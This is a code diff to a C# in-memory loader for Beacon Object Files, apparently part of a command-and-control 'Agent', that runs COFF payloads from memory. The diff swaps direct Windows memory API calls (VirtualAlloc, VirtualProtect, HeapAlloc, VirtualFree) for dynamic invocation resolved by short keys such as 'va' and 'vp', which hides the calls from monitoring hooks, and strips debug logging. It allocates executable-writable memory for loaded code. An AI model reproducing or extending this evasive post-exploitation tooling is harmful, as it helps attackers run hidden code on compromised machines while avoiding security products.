@@ -1,11 +1,11 @@
-﻿#define _AMD64
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using Invoker.Dynamic;
 
 namespace Agent
 {
@@ -35,6 +35,13 @@ namespace Agent
         public int argument_buffer_size { get; set; }
         private string InternalDLLName { get; set; } = "RunOF";
 
+        private delegate IntPtr VaDelegate(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
+        private delegate bool VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        private delegate nint gphDelegate();
+        private delegate IntPtr hadelegate(IntPtr hHeap, uint dwFlags, uint dwBytes);
+        private delegate void ZMDelegate(IntPtr dest, int size);
+        private delegate bool HFDelegate(IntPtr hHeap, uint dwFlags, IntPtr lpMem);
+        private delegate bool VFDelegate(IntPtr pAddress, uint size, uint freeType);
         private enum ARCH : int
         {
             I386 = 0,
@@ -45,8 +52,6 @@ namespace Agent
         {
             try
             {
-                ////Logger.Debug($"--- Loading object file from byte array ---");
-
                 if (iat != null)
                 {
                     this.iat = iat;
@@ -135,8 +140,9 @@ namespace Agent
                 ////Logger.Debug($"We need to allocate {total_pages} pages of memory");
                 size = total_pages * Environment.SystemPageSize;
 
-                base_addr = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)(total_pages * Environment.SystemPageSize), NativeDeclarations.MEM_RESERVE, NativeDeclarations.PAGE_EXECUTE_READWRITE);
-                ////Logger.Debug($"Mapped image base @ 0x{base_addr.ToInt64():x}");
+                object[] vaParams = new object[] { IntPtr.Zero, (uint)(total_pages * Environment.SystemPageSize), NativeDeclarations.MEM_RESERVE, NativeDeclarations.PAGE_EXECUTE_READWRITE };
+                base_addr = Generic.InvokeFunc<nint>(Resolver.GetFunc("va"), typeof(VaDelegate), ref vaParams);
+
                 int num_pages = 0;
 
                 for (int i = 0; i < this.section_headers.Count; i++)
@@ -154,9 +160,12 @@ namespace Agent
                         }
                         ////Logger.Debug($"This section needs {section_pages} pages");
                         // we allocate section_pages * pagesize bytes
-                        var addr = NativeDeclarations.VirtualAlloc(IntPtr.Add(this.base_addr, num_pages * Environment.SystemPageSize), (uint)(section_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
+
+                        object[] vaParams2 = new object[] { IntPtr.Add(this.base_addr, num_pages * Environment.SystemPageSize), (uint)(section_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE };
+                        var addr = Generic.InvokeFunc<nint>(Resolver.GetFunc("va"), typeof(VaDelegate), ref vaParams2);
+
                         num_pages += section_pages;
-                        ////Logger.Debug($"Copying section to 0x{addr.ToInt64():X}");
+
                         // but we only copy sizeofrawdata (which will almost always be less than the amount we allocated)
                         Marshal.Copy(file_contents, (int)section_header.PointerToRawData, addr, (int)section_header.SizeOfRawData);
                         ////Logger.Debug($"Updating section ptrToRawData to {(addr.ToInt64() - this.base_addr.ToInt64()):X}");
@@ -208,8 +217,6 @@ namespace Agent
             // how do we know if we allocated this section?
             foreach (var perm in this.permissions)
             {
-
-
                 bool x = (perm.Characteristics & NativeDeclarations.IMAGE_SCN_MEM_EXECUTE) != 0;
                 bool r = (perm.Characteristics & NativeDeclarations.IMAGE_SCN_MEM_READ) != 0;
                 bool w = (perm.Characteristics & NativeDeclarations.IMAGE_SCN_MEM_WRITE) != 0;
@@ -227,10 +234,9 @@ namespace Agent
                 {
                     throw new Exception($"Unable to parse section memory permissions for section {perm.SectionName}: 0x{perm.Characteristics:x}");
                 }
-
-                //Logger.Debug($"Setting permissions for section {perm.SectionName} @ {perm.Addr.ToInt64():X} to R: {r}, W: {w}, X: {x}");
-
-                NativeDeclarations.VirtualProtect(perm.Addr, (UIntPtr)(perm.Size), page_permissions, out _);
+                uint throwaway = 0;
+                object[] vpParams = new object[] { perm.Addr, (UIntPtr)(perm.Size), page_permissions, throwaway };
+                var result = Generic.InvokeFunc<bool>(Resolver.GetFunc("vp"), typeof(VPDelegate), ref vpParams);
 
             }
 
@@ -238,7 +244,6 @@ namespace Agent
 
         public IntPtr ResolveHelpers(byte[] serialised_args, bool debug)
         {
-            ////Logger.Debug("Looking for beacon helper functions");
             bool global_buffer_found = false;
             bool global_buffer_len_found = false;
             bool argument_buffer_found = false;
@@ -251,25 +256,21 @@ namespace Agent
                 if ((symbol_name.StartsWith(this.HelperPrefix + "Beacon") || symbol_name.StartsWith(this.HelperPrefix + "toWideChar")) && symbol.Type == IMAGE_SYMBOL_TYPE.IMAGE_SYM_TYPE_FUNC)
                 {
                     var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);
-
-                    //Logger.Debug($"\tFound helper function {symbol_name} - {symbol.Value}");
-                    //Logger.Debug($"\t[=] Address: {symbol_addr.ToInt64():X}");
                     this.iat.Add(this.InternalDLLName, symbol_name.Replace("_", string.Empty), symbol_addr);
                 }
                 else if (symbol_name == this.HelperPrefix + "global_buffer")
                 {
+                    object[] gph = new object[0];
+                    var heap_handle = Generic.InvokeFunc<nint>(Resolver.GetFunc("gph"), typeof(gphDelegate), ref gph);
 
-                    var heap_handle = NativeDeclarations.GetProcessHeap();
-                    var mem = NativeDeclarations.HeapAlloc(heap_handle, (uint)NativeDeclarations.HeapAllocFlags.HEAP_ZERO_MEMORY, (uint)this.global_buffer_size);
-                    //this.global_buffer = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)this.global_buffer_size, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
-                    //Logger.Debug($"Allocated a {this.global_buffer_size} bytes global buffer @ {mem.ToInt64():X}");
+
+                    object[] haParams = new object[] { heap_handle, (uint)NativeDeclarations.HeapAllocFlags.HEAP_ZERO_MEMORY, (uint)this.global_buffer_size };
+                    var mem = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("ha"), typeof(hadelegate), ref haParams);
+
                     var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);
-                    //Logger.Debug("Found global buffer");
-                    //Logger.Debug($"\t[=] Address: {symbol_addr.ToInt64():X}");
                     //write the address of the global buffer we allocated to allow it to move around (e.g. realloc)
                     Marshal.WriteIntPtr(symbol_addr, mem);
                     this.global_buffer = symbol_addr;
-                    // save the location of our global_buffer_ptr
 
                     global_buffer_found = true;
                 }
@@ -278,7 +279,9 @@ namespace Agent
                     if (serialised_args.Length > 0)
                     {
                         //Logger.Debug($"Allocating argument buffer of length {serialised_args.Length}");
-                        this.argument_buffer = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)serialised_args.Length, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
+                        object[] vaParams = new object[] { IntPtr.Zero, (uint)serialised_args.Length, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE };
+                        this.argument_buffer = Generic.InvokeFunc<nint>(Resolver.GetFunc("va"), typeof(VaDelegate), ref vaParams);
+
                         // Copy our data into it 
                         Marshal.Copy(serialised_args, 0, this.argument_buffer, serialised_args.Length);
 
@@ -378,38 +381,38 @@ namespace Agent
             // Note the global_buffer must be cleared *before* the COFF as we need to read its location from the COFF's memory
             if (this.global_buffer != IntPtr.Zero)
             {
-
-                //Logger.Debug($"Zeroing and freeing loaded global buffer at 0x{this.global_buffer.ToInt64():X} with size 0x{this.global_buffer_size:X}");
-
                 // the global_buffer can move around if the BOF reallocs to make it bigger so we need to read its final location from memory
                 var output_addr = Marshal.ReadIntPtr(this.global_buffer);
                 var output_size = Marshal.ReadInt32(this.global_buffer_size_ptr);
 
+                //How do I call with no return type?
                 NativeDeclarations.ZeroMemory(output_addr, output_size);
-                var heap_handle = NativeDeclarations.GetProcessHeap();
+                object[] gph = new object[0];
+                var heap_handle = Generic.InvokeFunc<nint>(Resolver.GetFunc("gph"), typeof(gphDelegate), ref gph);
 
-                NativeDeclarations.HeapFree(heap_handle, 0, output_addr);
+                object[] hfParams = new object[] { heap_handle, (uint)0, output_addr };
+                var result = Generic.InvokeFunc<bool>(Resolver.GetFunc("hf"), typeof(HFDelegate), ref hfParams);
             }
 
             if (this.argument_buffer != IntPtr.Zero)
             {
-                //Logger.Debug($"Zeroing and freeing arg buffer at 0x{this.argument_buffer.ToInt64():X} with size 0x{this.argument_buffer_size:X}");
-
                 NativeDeclarations.ZeroMemory(this.argument_buffer, this.argument_buffer_size);
-                NativeDeclarations.VirtualFree(this.argument_buffer, 0, NativeDeclarations.MEM_RELEASE);
-            }
 
-            //Logger.Debug($"Zeroing and freeing loaded COFF image at 0x{this.base_addr:X} with size 0x{this.size:X}");
+                object[] vfParams = new object[] { this.argument_buffer, (uint)0, NativeDeclarations.MEM_RELEASE };
+                var result = Generic.InvokeFunc<bool>(Resolver.GetFunc("vf"), typeof(VFDelegate), ref vfParams);
+            }
 
             // Make sure mem is writeable
             foreach (var perm in this.permissions)
             {
-                NativeDeclarations.VirtualProtect(perm.Addr, (UIntPtr)(perm.Size), NativeDeclarations.PAGE_READWRITE, out _);
-
+                uint oldProtect = 0;
+                object[] vpParams = new object[] { perm.Addr, (UIntPtr)(perm.Size), NativeDeclarations.PAGE_READWRITE, oldProtect };
+                var vpResult = Generic.InvokeFunc<bool>(Resolver.GetFunc("vp"), typeof(VPDelegate), ref vpParams);
             }
             // zero out memory
             NativeDeclarations.ZeroMemory(this.base_addr, (int)this.size);
-            NativeDeclarations.VirtualFree(this.base_addr, 0, NativeDeclarations.MEM_RELEASE);
+            object[] vfParams2 = new object[] { this.base_addr, (uint)0, NativeDeclarations.MEM_RELEASE };
+            var result2 = Generic.InvokeFunc<bool>(Resolver.GetFunc("vf"), typeof(VFDelegate), ref vfParams2);
         }
 
 
@@ -429,8 +432,6 @@ namespace Agent
             {
                 this.section_headers.Add(Deserialize<IMAGE_SECTION_HEADER>(reader.ReadBytes(Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))));
             }
-
-            // TODO - initialise BSS section as zero. For now, not a problem as Cobalt doesn't do this so you're told to init anything to use;
         }
 
         private void FindSymbols()
@@ -441,8 +442,6 @@ namespace Agent
             {
                 this.symbols.Add(Deserialize<IMAGE_SYMBOL>(reader.ReadBytes(Marshal.SizeOf(typeof(IMAGE_SYMBOL)))));
             }
-            //Logger.Debug($"Created list of {this.symbols.Count} symbols");
-
         }
 
 
@@ -450,7 +449,6 @@ namespace Agent
         {
             if (section_header.NumberOfRelocations > 0)
             {
-                //Logger.Debug($"Processing {section_header.NumberOfRelocations} relocations for {Encoding.ASCII.GetString(section_header.Name)} section from offset {section_header.PointerToRelocations:X}");
                 this.stream.Seek(section_header.PointerToRelocations, SeekOrigin.Begin);
 
                 for (int i = 0; i < section_header.NumberOfRelocations; i++)
@@ -458,7 +456,6 @@ namespace Agent
                     var struct_bytes = reader.ReadBytes(Marshal.SizeOf(typeof(IMAGE_RELOCATION)));
 
                     IMAGE_RELOCATION reloc = Deserialize<IMAGE_RELOCATION>(struct_bytes);
-                    //Logger.Debug($"Got reloc info: {reloc.VirtualAddress:X} - {reloc.SymbolTableIndex:X} - {reloc.Type} - @ {(this.base_addr + (int)section_header.PointerToRawData + (int)reloc.VirtualAddress).ToInt64():X}");
 
                     if ((int)reloc.SymbolTableIndex > this.symbols.Count || (int)reloc.SymbolTableIndex < 0)
                     {
@@ -466,7 +463,6 @@ namespace Agent
                     }
                     IMAGE_SYMBOL reloc_symbol = this.symbols[(int)reloc.SymbolTableIndex];
                     var symbol_name = GetSymbolName(reloc_symbol);
-                    //Logger.Debug($"Relocation name: {symbol_name}");
                     if (reloc_symbol.SectionNumber == IMAGE_SECTION_NUMBER.IMAGE_SYM_UNDEFINED)
                     {
 
@@ -495,9 +491,6 @@ namespace Agent
                         else
                         {
                             // This is a win32 api function
-
-                            //Logger.Debug("Win32API function");
-
                             string symbol_cleaned = symbol_name.Replace(this.ImportPrefix, "");
                             string dll_name;
                             string func_name;
@@ -543,51 +536,9 @@ namespace Agent
 
                         switch (reloc.Type)
                         {
-#if _I386
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_ABSOLUTE:
-                                // The relocation is ignored
-                                break;
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR16:
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL16:
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SEG12:
-                                // The relocation is not supported;
-                                break;
-
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32:
-                                // The target's 32-bit VA.
-
-                                Marshal.WriteInt32(reloc_location, func_addr.ToInt32());
-                                break;
-
-
-
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL32:
-                                // TODO - not seen this "in the wild"
-                                Marshal.WriteInt32(reloc_location, (func_addr.ToInt32()-4) - reloc_location.ToInt32());
-                                break;
-
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32NB:
-                                // The target's 32-bit RVA.
-                                Marshal.WriteInt32(reloc_location, (func_addr.ToInt32() - 4) - reloc_location.ToInt32() - this.base_addr.ToInt32());
-                                break;
-
-                            // These relocations will fall through as unhandled for now
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECTION:
-                            // The 16-bit section index of the section that contains the target. This is used to support debugging information.
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL:
-                            // The 32-bit offset of the target from the beginning of its section. This is used to support debugging information and static thread local storage.
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_TOKEN:
-                            // The CLR token.
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL7:
-                            // A 7-bit offset from the base of the section that contains the target.
-
-
-#elif _AMD64
                             case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_REL32:
                                 Marshal.WriteInt32(reloc_location, (int)((func_addr.ToInt64()-4) - (reloc_location.ToInt64()))); // subtract the size of the relocation (relative to the end of the reloc)
                                 break;
-
-#endif
                             default:
                                 throw new Exception($"Unable to process function relocation type {reloc.Type} - please file a bug report.");
                         }
@@ -600,54 +551,11 @@ namespace Agent
                         //Logger.Debug("\tResolving internal reference");
                         IntPtr reloc_location = this.base_addr + (int)section_header.PointerToRawData + (int)reloc.VirtualAddress;
                         //Logger.Debug($"reloc_location: 0x{reloc_location.ToInt64():X}, section offset: 0x{section_header.PointerToRawData:X} reloc VA: {reloc.VirtualAddress:X}");
-#if _I386
-                        Int32 current_value = Marshal.ReadInt32(reloc_location);
-                        Int32 object_addr;
-#elif _AMD64
                         Int64 current_value = Marshal.ReadInt64(reloc_location);
                         Int32 current_value_32 = Marshal.ReadInt32(reloc_location);
                         Int64 object_addr;
-#endif
-                        switch (reloc.Type)
+                    switch (reloc.Type)
                         {
-#if _I386
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_ABSOLUTE:
-                                // The relocation is ignored
-                                break;
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR16:
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL16:
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SEG12:
-                                // The relocation is not supported;
-                                break;
-
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32:
-                                // The target's 32-bit VA
-                                Marshal.WriteInt32(reloc_location, current_value + this.base_addr.ToInt32() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData);
-                                break;
-
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_REL32:
-                                // The target's 32-bit RVA
-                                object_addr = current_value + this.base_addr.ToInt32() + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
-                                Marshal.WriteInt32(reloc_location, (object_addr-4) - reloc_location.ToInt32() );
-                                break;
-
-
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_DIR32NB:
-                                // The target's 32-bit RVA.
-                                object_addr = current_value + (int)this.section_headers[(int)reloc_symbol.SectionNumber - 1].PointerToRawData;
-                                Marshal.WriteInt32(reloc_location, (object_addr - 4) - reloc_location.ToInt32());
-                                break;
-
-                            // These relocations will fall through as unhandled for now
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECTION:
-                            // The 16-bit section index of the section that contains the target. This is used to support debugging information.
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL:
-                            // The 32-bit offset of the target from the beginning of its section. This is used to support debugging information and static thread local storage.
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_TOKEN:
-                            // The CLR token.
-                            case IMAGE_RELOCATION_TYPE.IMAGE_REL_I386_SECREL7:
-                            // A 7-bit offset from the base of the section that contains the target.
-#elif _AMD64
                             case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_ABSOLUTE:
                                 // The relocation is ignored
                                 break;
@@ -713,7 +621,6 @@ namespace Agent
                                 // A pair that must immediately follow every span-dependent value.
                             case IMAGE_RELOCATION_TYPE.IMAGE_REL_AMD64_SSPAN32:
                                 // A 32-bit signed span-dependent value that is applied at link time.
-#endif
 
                             default:
                                 throw new Exception($"Unhandled relocation type {reloc.Type} - please file a bug report");
